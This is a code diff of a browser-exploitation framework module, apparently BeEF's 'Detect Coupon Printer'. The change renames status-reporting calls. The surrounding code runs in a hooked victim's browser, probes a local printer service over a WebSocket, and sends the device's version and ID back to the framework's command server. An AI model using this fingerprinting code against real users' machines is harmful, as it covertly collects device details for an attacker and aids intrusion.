@@ -8,7 +8,7 @@ beef.execute(function() {
 
   if (!beef.browser.hasWebSocket()) {
     beef.debug('[Detect Coupon Printer] Error: browser does not support WebSockets');
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.status.error());
   }
 
   //var url = 'ws://127.0.0.1:2687';
@@ -33,7 +33,7 @@ beef.execute(function() {
 
   socket.onerror = function(error) {
     beef.debug('[Detect Coupon Printer] WebSocket Error: ' + JSON.stringify(error));
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not detect coupon printer", beef.are.status_error());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not detect coupon printer", beef.status.error());
   };
 
   socket.onclose = function(event) {
@@ -46,13 +46,13 @@ beef.execute(function() {
       var result = JSON.parse(event.data);
       if (result['GetVersion']) {
         beef.debug('[Detect Coupon Printer] Version: ' + result['GetVersion']);
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, "GetVersion=" + result['GetVersion'], beef.are.status_success());
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, "GetVersion=" + result['GetVersion'], beef.status.success());
       } else if (result['GetDeviceID']) {
         beef.debug('[Detect Coupon Printer] Device ID: ' + result['GetDeviceID']);
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, "GetDeviceID=" + result['GetDeviceID'], beef.are.status_success());
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, "GetDeviceID=" + result['GetDeviceID'], beef.status.success());
       } else if (result['CheckPrinter']) {
         beef.debug('[Detect Coupon Printer] Printer: ' + result['CheckPrinter']);
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, "CheckPrinter=" + result['CheckPrinter'], beef.are.status_success());
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, "CheckPrinter=" + result['CheckPrinter'], beef.status.success());
       }
     } catch(e) {
       beef.debug('Could not parse WebSocket response JSON: ' + event.data);
